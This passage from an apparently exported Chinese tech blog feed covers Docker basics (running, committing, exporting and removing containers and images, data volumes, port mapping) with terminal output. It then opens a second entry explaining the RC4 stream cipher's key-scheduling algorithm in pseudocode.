<h2 id="2-运行容器"><a href="#2-运行容器" class="headerlink" title="2. 运行容器"></a>2. 运行容器</h2><p>使用<code>docker run</code> 根据镜像新建并运行容器。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker run -it --name namestring ubuntu:<span class="number">14.04</span> bash                                                                                                </div><div class="line">root@fd93decf46b8:/<span class="comment"># cat /etc/os-release</span></div><div class="line">NAME=<span class="string">"Ubuntu"</span></div><div class="line">VERSION=<span class="string">"14.04.5 LTS, Trusty Tahr"</span></div><div class="line">ID=ubuntu</div><div class="line">ID_LIKE=debian</div><div class="line">PRETTY_NAME=<span class="string">"Ubuntu 14.04.5 LTS"</span></div><div class="line">VERSION_ID=<span class="string">"14.04"</span></div><div class="line">HOME_URL=<span class="string">"http://www.ubuntu.com/"</span></div><div class="line">SUPPORT_URL=<span class="string">"http://help.ubuntu.com/"</span></div><div class="line">BUG_REPORT_URL=<span class="string">"http://bugs.launchpad.net/ubuntu/"</span></div><div class="line">root@fd93decf46b8:/<span class="comment">#</span></div></pre></td></tr></table></figure></p>
<blockquote>
<p>-it：这是两个参数，-i 是交互式操作，-t 为交互式终端。<br>–name: 指定新建容器的名称<br>ubuntu:14.04：指用 ubuntu:14.04 镜像为基础来启动容器。<br>bash：放在镜像名后的是命令，运行bash 返回交互式 Shell。</p>
</blockquote>
<p>进入容器后，可以在 Shell 下操作，执行任何所需的命令。最后可以通过 exit 退出容器。</p>
<p>退出容器后可以使用 <code>docker exec</code> 命令进入容器。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker ps -a</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line">fd93decf46b8        ubuntu:<span class="number">14.04</span>        <span class="string">"bash"</span>              <span class="number">3</span> hours ago         Up About an hour                        practical_raman</div><div class="line">lc@ubuntu:~$ sudo docker <span class="keyword">exec</span> -it fd93decf46b8 bash</div><div class="line">root@fd93decf46b8:/<span class="comment">#</span></div></pre></td></tr></table></figure></p>
<h2 id="3-列出镜像"><a href="#3-列出镜像" class="headerlink" title="3. 列出镜像"></a>3. 列出镜像</h2><p>使用<code>docker images</code> 命令可以列出已经下载的镜像。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker images</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">ubuntu              <span class="number">14.04</span>               dea1945146b9        <span class="number">2</span> weeks ago         <span class="number">188</span>MB</div></pre></td></tr></table></figure></p>
<p>列表包含了仓库名、标签、镜像 ID、创建时间以及所占用的空间。</p>
<h2 id="4-保存镜像"><a href="#4-保存镜像" class="headerlink" title="4. 保存镜像"></a>4. 保存镜像</h2><p>当修改容器的文件后，可以使用命令<code>docker diff</code>查看具体的改动。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker diff fd93decf46b8</div><div class="line">C /root</div><div class="line">A /root/.bash_history</div></pre></td></tr></table></figure></p>
<p>在不使用卷的情况下运行一个容器时，任何文件修改都会被记录于容器存储层里。而 Docker 提供的 <code>docker commit</code> 命令可以将容器的存储层保存下来成为镜像，语法格式为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker commit [选项] &lt;容器ID或容器名&gt; [&lt;仓库名&gt;[:&lt;标签&gt;]]</div></pre></td></tr></table></figure></p>
<p>用下面的命令将容器保存为镜像：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker commit --author <span class="string">"0x4C43"</span> --message <span class="string">"modify"</span> fd93decf46b8 ubuntu:v2</div><div class="line">sha256:<span class="number">011e54908</span>d10c0f77efdc7ff4fe2c7ec61ba9e0a43d5e862264a914e74c5b0b0</div><div class="line">lc@ubuntu:~$ sudo docker images</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">ubuntu              v2                  <span class="number">011e54908</span>d10        <span class="number">12</span> seconds ago      <span class="number">188</span>MB</div><div class="line">ubuntu              <span class="number">14.04</span>               dea1945146b9        <span class="number">2</span> weeks ago         <span class="number">188</span>MB</div></pre></td></tr></table></figure></p>
<p>其中 –author 指定修改的作者，而 –message 记录本次修改的内容。</p>
<p>使用 <code>docker commit</code> 意味着所有对镜像的操作都是黑箱操作，生成的镜像也被称为黑箱镜像。在实际应用中使用 Dockerfile 来定制镜像。</p>
<h2 id="5-删除镜像"><a href="#5-删除镜像" class="headerlink" title="5. 删除镜像"></a>5. 删除镜像</h2><p>如果要删除本地的镜像，可以使用 <code>docker    rmi</code> 命令。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker images</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">ubuntu              latest              <span class="number">2</span>d696327ab2e        <span class="number">2</span> weeks ago         <span class="number">122</span>MB</div><div class="line">ubuntu              <span class="number">14.04</span>               dea1945146b9        <span class="number">2</span> weeks ago         <span class="number">188</span>MB</div><div class="line">lc@ubuntu:~$ sudo docker rmi dea19</div><div class="line">Untagged: ubuntu:<span class="number">14.04</span></div><div class="line">Untagged: ubuntu@sha256:<span class="number">6e3</span>e3f3c5c36a91ba17ea002f63e5607ed6a8c8e5fbbddb31ad3e15638b51ebc</div><div class="line">Deleted: sha256:dea1945146b96542e6e20642830c78df702d524a113605a906397db1db022703</div><div class="line">Deleted: sha256:<span class="number">6401e3024</span>b4d4ef4c981cde2e830858eb790ee84284e1401cf569a6db8df51d9</div><div class="line">Deleted: sha256:f12ee38eb7aa0ffdd43c657b433d91ac4c2930887c02eb638fd1518f374bc738</div><div class="line">Deleted: sha256:<span class="number">9</span>ac64e2751425199591402799079940629829c7c2fc0e083fb714e5dd94d70a9</div><div class="line">Deleted: sha256:<span class="number">12</span>a6279e654d2f23c2fa086bf2dcd82e1a2c82b01028379bbf2cde061d9235e6</div><div class="line">Deleted: sha256:c47d9b229ca4eaf5d3b85b6fa7f794d00910a42634dd0fd5107a9a937b13b20f</div></pre></td></tr></table></figure></p>
<h1 id="0x03-容器"><a href="#0x03-容器" class="headerlink" title="0x03 容器"></a>0x03 容器</h1><p>镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</p>
<p>容器的实质是进程，但与直接在宿主执行的进程不同，容器进程运行于属于自己的独立的 命名空间。因此容器可以拥有自己的 root 文件系统、自己的网络配置、自己的进程空间，甚至自己的用户 ID 空间。容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下操作一样。这种特性使得容器封装的应用比直接在宿主运行更加安全。</p>
<h2 id="1-启动容器"><a href="#1-启动容器" class="headerlink" title="1. 启动容器"></a>1. 启动容器</h2><p>启动容器有两种方式，一种是基于镜像新建一个容器并启动，另外一个是将在终止状态（stopped）的容器重新启动。</p>
<p><strong>a. 新建并启动</strong><br>如 0x02 中所示，使用 <code>docker run</code> 启动一个容器。利用这种方式来创建容器时，Docker 在后台运行的标准操作包括：</p>
<blockquote>
<p>检查本地是否存在指定的镜像，不存在就从公有仓库下载<br>利用镜像创建并启动一个容器<br>分配一个文件系统，并在只读的镜像层外面挂载一层可读写层<br>从宿主主机配置的网桥接口中桥接一个虚拟接口到容器中去<br>从地址池配置一个 ip 地址给容器<br>执行用户指定的应用程序<br>执行完毕后容器被终止    </p>
</blockquote>
<p><strong>b. 启动已终止容器</strong><br>可以利用<code>docker start</code> 命令，直接将一个已经终止的容器启动运行。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker ps -a</div><div class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                      PORTS               NAMES</div><div class="line"><span class="number">57002</span>ad935b0        ubuntu:latest       <span class="string">"/bin/echo 'Hello ..."</span>   <span class="number">9</span> minutes ago       Exited (<span class="number">0</span>) <span class="number">12</span> seconds ago                       silly_gates</div><div class="line">f636101c203a        <span class="number">2</span>d696327ab2e        <span class="string">"bash"</span>                   <span class="number">19</span> hours ago        Up <span class="number">19</span> hours                                     ecstatic_morse</div><div class="line">lc@ubuntu:~$ sudo docker start -i <span class="number">5700</span></div><div class="line">Hello World!</div></pre></td></tr></table></figure></p>
<p><strong>c. 守护态运行</strong><br>更多的时候，需要让 Docker在后台运行而不是直接把执行命令的结果输出在当前宿主机下。此时，可以通过添加 -d 参数来实现。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker image ls</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">ubuntu              latest              <span class="number">2</span>d696327ab2e        <span class="number">2</span> weeks ago         <span class="number">122</span>MB</div><div class="line">lc@ubuntu:~$ sudo docker run -it -d <span class="number">2</span>d696 bash</div><div class="line"><span class="number">931</span>a04d6ac702a478b4c994b7f756eddd4801144be10bc9c760437fd6c9a962f</div><div class="line">lc@ubuntu:~$ sudo docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line"><span class="number">931</span>a04d6ac70        <span class="number">2</span>d696               <span class="string">"bash"</span>              <span class="number">10</span> seconds ago      Up <span class="number">9</span> seconds                            agitated_kepler</div></pre></td></tr></table></figure></p>
<h2 id="2-终止容器"><a href="#2-终止容器" class="headerlink" title="2. 终止容器"></a>2. 终止容器</h2><p>可以使用 <code>docker stop</code> 来终止一个运行中的容器。</p>
<p>此外，当Docker容器中指定的应用终结时，容器也自动终止。 例如对于只启动了一个终端的容器，用户通过 exit 命令或 Ctrl+d 来退出终端时，所创建的容器立刻终止。</p>
<p>终止状态的容器可以用 docker ps -a 命令看到。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker ps -a</div><div class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                      PORTS               NAMES</div><div class="line"><span class="number">4</span>c95f2701cbd        <span class="number">2</span>d696               <span class="string">"bash"</span>                   <span class="number">4</span> minutes ago       Exited (<span class="number">0</span>) <span class="number">44</span> seconds ago                       vigilant_beaver</div><div class="line"><span class="number">57002</span>ad935b0        ubuntu:latest       <span class="string">"/bin/echo 'Hello ..."</span>   About an hour ago   Exited (<span class="number">0</span>) <span class="number">5</span> minutes ago                        silly_gates</div><div class="line">f636101c203a        <span class="number">2</span>d696327ab2e        <span class="string">"bash"</span>                   <span class="number">20</span> hours ago        Exited (<span class="number">0</span>) <span class="number">8</span> minutes ago                        ecstatic_morse</div></pre></td></tr></table></figure></p>
<h2 id="3-进入容器"><a href="#3-进入容器" class="headerlink" title="3.  进入容器"></a>3.  进入容器</h2><p>当需要进入在后台运行的容器时，可以使用<code>docker attach</code>命令进行操作。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line"><span class="number">931</span>a04d6ac70        <span class="number">2</span>d696               <span class="string">"bash"</span>              <span class="number">10</span> seconds ago      Up <span class="number">9</span> seconds                            agitated_kepler</div><div class="line">lc@ubuntu:~$ sudo docker attach <span class="number">931</span>a</div><div class="line">root@<span class="number">931</span>a04d6ac70:/<span class="comment">#</span></div></pre></td></tr></table></figure></p>
<h2 id="4-导出和导入容器"><a href="#4-导出和导入容器" class="headerlink" title="4.  导出和导入容器"></a>4.  导出和导入容器</h2><p>使用 <code>docker export</code> 命令可以导出容器快照到本地文件。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line"><span class="number">931</span>a04d6ac70        <span class="number">2</span>d696               <span class="string">"bash"</span>              <span class="number">45</span> minutes ago      Up <span class="number">10</span> seconds                           agitated_kepler</div><div class="line">lc@ubuntu:~$ sudo docker export <span class="number">931</span>a &gt; ubuntu.tar</div></pre></td></tr></table></figure></p>
<p>使用<code>docker import</code>可以将本地快照文件导入为镜像。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ cat ubuntu.tar | sudo docker <span class="keyword">import</span> - ubuntu:v1                                                                                      </div><div class="line">sha256:<span class="number">22e45</span>fa74eac9efd1f3024044ef2e018495ae67efc67b7600b29f8fec88e57b2</div><div class="line">lc@ubuntu:~$ sudo docker images                                                                                                                   </div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">ubuntu              v1                  <span class="number">22e45</span>fa74eac        <span class="number">5</span> seconds ago       <span class="number">98.2</span>MB</div><div class="line">ubuntu              latest              <span class="number">2</span>d696327ab2e        <span class="number">2</span> weeks ago         <span class="number">122</span>MB</div></pre></td></tr></table></figure></p>
<h2 id="5-删除容器"><a href="#5-删除容器" class="headerlink" title="5. 删除容器"></a>5. 删除容器</h2><p>使用 <code>docker rm</code> 可以删除处于终止状态的容器。如果要删除一个运行中的容器，可以添加 -f 参数。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker ps -a                                                                                                                    </div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                      PORTS               NAMES</div><div class="line"><span class="number">5</span>bc510e165b4        <span class="number">22e45</span>               <span class="string">"bash"</span>              <span class="number">43</span> seconds ago      Exited (<span class="number">0</span>) <span class="number">32</span> seconds ago                       priceless_jackson</div><div class="line"><span class="number">931</span>a04d6ac70        <span class="number">2</span>d696               <span class="string">"bash"</span>              About an hour ago   Exited (<span class="number">0</span>) <span class="number">7</span> minutes ago                        agitated_kepler</div><div class="line">lc@ubuntu:~$ sudo docker rm <span class="number">5</span>bc51</div><div class="line"><span class="number">5</span>bc51</div><div class="line">lc@ubuntu:~$ sudo docker ps -a   </div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                     PORTS               NAMES</div><div class="line"><span class="number">931</span>a04d6ac70        <span class="number">2</span>d696               <span class="string">"bash"</span>              About an hour ago   Exited (<span class="number">0</span>) <span class="number">7</span> minutes ago                       agitated_kepler</div></pre></td></tr></table></figure></p>
<h1 id="0x04-数据管理"><a href="#0x04-数据管理" class="headerlink" title="0x04 数据管理"></a>0x04 数据管理</h1><p>在容器中管理数据主要有两种方式：数据卷（Data volumes）和数据卷容器（Data volume containers）。</p>
<h2 id="1-数据卷"><a href="#1-数据卷" class="headerlink" title="1. 数据卷"></a>1. 数据卷</h2><p>数据卷是一个可供一个或多个容器使用的特殊目录，有以下特性：</p>
<blockquote>
<p>数据卷可以在容器之间共享和重用<br>对数据卷的修改会立马生效<br>对数据卷的更新，不会影响镜像<br>数据卷默认会一直存在，即使容器被删除</p>
</blockquote>
<p><strong>a. 创建数据卷</strong><br>在用 <code>docker run</code> 命令时，使用 -v 选项可创建一个数据卷并挂载到容器里。下面创建一个名为 testVolume 的容器，并加载一个数据卷到容器的 /Volume 目录。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker run -it --name testVolume -v /Volume <span class="number">2</span>d696 bash</div><div class="line">root@a48cd127e2e9:/<span class="comment"># ls</span></div><div class="line">Volume  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</div></pre></td></tr></table></figure></p>
<p>此外，可以指定挂载一个本地主机的目录到容器中去。本地目录的路径必须是绝对路径，如果目录不存在 Docker 会自动为你创建它。下面将本地主机的 localVolume 目录挂载到容器的 /testVolume 目录。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker images</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">ubuntu              v1                  <span class="number">22e45</span>fa74eac        <span class="number">5</span> hours ago         <span class="number">98.2</span>MB</div><div class="line">ubuntu              latest              <span class="number">2</span>d696327ab2e        <span class="number">2</span> weeks ago         <span class="number">122</span>MB</div><div class="line">lc@ubuntu:~$ sudo docker run -it -v /home/lc/localVolume:/testVolume <span class="number">2</span>d69 bash</div><div class="line"></div><div class="line">root@f3f239c230b7:/<span class="comment">#</span></div><div class="line">root@f3f239c230b7:/<span class="comment"># ls</span></div><div class="line">bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  testVolume  tmp  usr  var</div><div class="line">root@f3f239c230b7:/<span class="comment"># cat testVolume/test</span></div><div class="line">Hello World!!!</div></pre></td></tr></table></figure></p>
<p>Docker 挂载数据卷的默认权限是读写，用户也可以通过 :ro 指定为只读。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker run -it -v /home/lc/localVolume:/testVolume:ro <span class="number">2</span>d69 bash</div><div class="line">root@d478e93818b6:/<span class="comment"># ls</span></div><div class="line">bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  testVolume  tmp  usr  var</div><div class="line">root@d478e93818b6:/<span class="comment"># ls -l testVolume/</span></div><div class="line">total <span class="number">0</span></div><div class="line">-rw-rw-r-- <span class="number">1</span> <span class="number">1000</span> <span class="number">1000</span> <span class="number">0</span> Oct  <span class="number">4</span> <span class="number">14</span>:<span class="number">55</span> hello</div><div class="line">root@d478e93818b6:/<span class="comment"># rm /testVolume/hello</span></div><div class="line">rm: cannot remove <span class="string">'/testVolume/hello'</span>: Read-only file system</div></pre></td></tr></table></figure></p>
<p><strong>b. 删除数据卷</strong><br> 数据卷是被设计用来持久化数据的，它的生命周期独立于容器，Docker不会在容器被删除后自动删除数据卷，并且也不存在垃圾回收这样的机制来处理没有任何容器引用的数据卷。</p>
<p>在删除容器的时候使用 <code>docker rm -v</code> 命令可以在删除容器的同时移除数据卷。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo find / -name Volume</div><div class="line">/var/lib/docker/aufs/diff/d067854784e90619885211e81920c13cc34d2320adacec7826faef5bc6819d27/Volume</div><div class="line">/var/lib/docker/aufs/mnt/d067854784e90619885211e81920c13cc34d2320adacec7826faef5bc6819d27/Volume</div><div class="line"></div><div class="line">lc@ubuntu:~$ sudo docker ps -a</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                         PORTS               NAMES</div><div class="line">a48cd127e2e9        <span class="number">2</span>d696               <span class="string">"bash"</span>              About an hour ago   Exited (<span class="number">0</span>) <span class="number">12</span> seconds ago                          testVolume</div><div class="line"><span class="number">931</span>a04d6ac70        <span class="number">2</span>d696               <span class="string">"bash"</span>              <span class="number">6</span> hours ago         Exited (<span class="number">0</span>) About an hour ago                       agitated_kepler</div><div class="line">lc@ubuntu:~$ sudo docker rm -v a48cd</div><div class="line">a48cd</div><div class="line"></div><div class="line">lc@ubuntu:~$ sudo find / -name Volume</div><div class="line">lc@ubuntu:~$</div></pre></td></tr></table></figure>
<p><strong>c. 查看数据卷信息</strong><br>使用<code>docker inspect</code> 命令可以查看容器的详细信息，找到其中有关数据卷的项：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="string">"Mounts"</span>: [</div><div class="line">    &#123;</div><div class="line">        <span class="string">"Type"</span>: <span class="string">"bind"</span>,</div><div class="line">        <span class="string">"Source"</span>: <span class="string">"/home/lc/localVolume"</span>,</div><div class="line">        <span class="string">"Destination"</span>: <span class="string">"/testVolume"</span>,</div><div class="line">        <span class="string">"Mode"</span>: <span class="string">"ro"</span>,</div><div class="line">        <span class="string">"RW"</span>: false,</div><div class="line">        <span class="string">"Propagation"</span>: <span class="string">"rprivate"</span></div><div class="line">    &#125;</div><div class="line">],</div></pre></td></tr></table></figure></p>
<h2 id="2-数据卷容器"><a href="#2-数据卷容器" class="headerlink" title="2. 数据卷容器"></a>2. 数据卷容器</h2><p>如果一些持续更新的数据需要在容器之间共享，可以创建数据卷容器。数据卷容器是一个正常的容器，提供数据卷供其它容器挂载。</p>
<p>首先，创建一个名为 dbdata 的数据卷容器：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker run -v /dbdata --name dbdata <span class="number">2</span>d696 echo Data-only container <span class="keyword">for</span> <span class="number">2</span>d696                                                  </div><div class="line">Data-only container <span class="keyword">for</span> <span class="number">2</span>d696</div><div class="line">lc@ubuntu:~$ sudo docker ps -a</div><div class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                      PORTS               NAMES</div><div class="line">ce22bb5c5b4d        <span class="number">2</span>d696               <span class="string">"echo Data-only co..."</span>   <span class="number">12</span> seconds ago      Exited (<span class="number">0</span>) <span class="number">10</span> seconds ago                       dbdata</div><div class="line"><span class="number">931</span>a04d6ac70        <span class="number">2</span>d696               <span class="string">"bash"</span>                   <span class="number">7</span> hours ago         Exited (<span class="number">0</span>) <span class="number">2</span> hours ago                          agitated_kepler</div></pre></td></tr></table></figure></p>
<p>然后，在其他容器中使用 –volumes-from 来挂载 dbdata 容器中的数据卷。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker run -it --volumes-<span class="keyword">from</span> dbdata --name db1 <span class="number">2</span>d696 bash                                                                      </div><div class="line">root@<span class="number">1</span>a40cd12ae27:/<span class="comment"># cd dbdata/       </span></div><div class="line">root@<span class="number">1</span>a40cd12ae27:/dbdata<span class="comment"># ls</span></div><div class="line">root@<span class="number">1</span>a40cd12ae27:/dbdata<span class="comment">#</span></div><div class="line"></div><div class="line">lc@ubuntu:~$ sudo docker run -it --volumes-<span class="keyword">from</span> dbdata --name db2 <span class="number">2</span>d696 bash</div><div class="line">root@<span class="number">5</span>d7f11a015f0:/<span class="comment"># ls</span></div><div class="line">bin  boot  dbdata  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</div><div class="line">root@<span class="number">5</span>d7f11a015f0:/<span class="comment"># cd dbdata/</span></div><div class="line">root@<span class="number">5</span>d7f11a015f0:/dbdata<span class="comment"># ls</span></div><div class="line">root@<span class="number">5</span>d7f11a015f0:/dbdata<span class="comment"># mkdir testvolume</span></div><div class="line"></div><div class="line">root@<span class="number">1</span>a40cd12ae27:/dbdata<span class="comment"># ls</span></div><div class="line">testvolume</div></pre></td></tr></table></figure></p>
<h1 id="0x05-网络配置"><a href="#0x05-网络配置" class="headerlink" title="0x05 网络配置"></a>0x05 网络配置</h1><p>通过 -P 或 -p 参数进行端口映射可以在外部访问容器中的网络应用。当使用 -P 标记时，Docker 会随机映射一个 49000~49900 的端口到内部容器开放的网络端口。</p>
<p>-p 则可以指定要映射的端口，在一个指定端口上只可以绑定一个容器。</p>
<h2 id="1-端口映射"><a href="#1-端口映射" class="headerlink" title="1. 端口映射"></a>1. 端口映射</h2><p>使用 <code>hostPort:containerPort</code> 将本地的 6666 端口映射到容器的 6666 端口。此时默认会绑定本地所有接口上的所有地址。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker run -it -d  -p 6666:6666 2d696 bash</div><div class="line">d6112543fa80c1c939f3ef0653efb7c5c29a5ccccc4dcae8fc81c764e743d1ff</div><div class="line">lc@ubuntu:~$ sudo docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                    NAMES</div><div class="line">d6112543fa80        2d696               "bash"              4 seconds ago       Up 3 seconds        0.0.0.0:6666-&gt;6666/tcp   objective_lumiere</div></pre></td></tr></table></figure></p>
<h2 id="2-查看映射端口"><a href="#2-查看映射端口" class="headerlink" title="2. 查看映射端口"></a>2. 查看映射端口</h2><p>使用 <code>docker port</code> 可查看当前映射的端口配置，也可以查看绑定的地址。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker port d611</div><div class="line">6666/tcp -&gt; 0.0.0.0:6666</div></pre></td></tr></table></figure></p>
<hr>
<p>References:<br>[1] <a href="https://yeasy.gitbooks.io/docker_practice/content/" target="_blank" rel="external">Docker — 从入门到实践</a><br>[2] <a href="https://blog.kinpzz.com/2017/05/16/docker-ci-cd/" target="_blank" rel="external">Docker 入门 &amp; CI/CD实践</a>       </p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[RC4 算法实现]]></title>
      <url>/2017/0919/rc4-algorithm-implementation/</url>
      <content type="html"><![CDATA[<p>RC4 是一种对称秘钥流加密算法，对称加密算法使用的加密和解密秘钥是相同的，或是从其中一个能很容易推导出另一个。RC4 算法的特点是算法简单，运行速度快，而且密钥长度是可变的，密钥长度范围为 1-256 字节。</p>
<h1 id="0x01-算法原理"><a href="#0x01-算法原理" class="headerlink" title="0x01 算法原理"></a>0x01 算法原理</h1><p>算法主要包括两个部分：1）使用 key-scheduling algorithm (KSA) 算法根据用户输入的秘钥 key 生成 S 盒；2）使用 Pseudo-random generation algorithm (PRGA) 算法生成秘钥流用于加密数据。</p>
<h2 id="1）初始化-S-盒"><a href="#1）初始化-S-盒" class="headerlink" title="1）初始化 S 盒"></a>1）初始化 S 盒</h2><p>KSA算法初始化长度为 256 的 S 盒。第一个 for 循环将 0 到 255 的互不重复的元素装入 S 盒；第二个 for 循环根据密钥打乱 S 盒。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i from <span class="number">0</span> to <span class="number">255</span></div><div class="line">    S[i] := i</div><div class="line">endfor</div><div class="line">j := <span class="number">0</span></div><div class="line"><span class="keyword">for</span> i from <span class="number">0</span> to <span class="number">255</span></div><div class="line">    j := (j + S[i] + key[i mod keylength]) mod <span class="number">256</span></div><div class="line">    swap values of S[i] <span class="keyword">and</span> S[j]</div><div class="line">endfor</div></pre></td></tr></table></figure></p>
